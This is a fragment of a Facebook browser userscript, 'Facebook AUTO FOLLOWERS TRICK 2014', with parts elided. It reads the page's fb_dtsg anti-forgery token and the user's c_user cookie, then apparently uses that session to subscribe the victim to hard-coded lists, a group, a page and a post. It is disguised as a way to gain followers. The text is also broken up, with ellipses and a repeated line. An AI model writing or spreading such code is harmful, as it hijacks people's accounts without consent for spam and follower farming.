// ==UserScript==
// @name           Facebook AUTO FOLLOWERS TRICK 2014
...
sublist("700602273303796");
sublist("700602573303766");
sublist("700602933303730");


//Group subscriber
var gid = ['505060772940746'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
var spage_id = "194891980717239";
var spost_id = "194892617383842";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "Done";
var smesaj_text = "Done";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
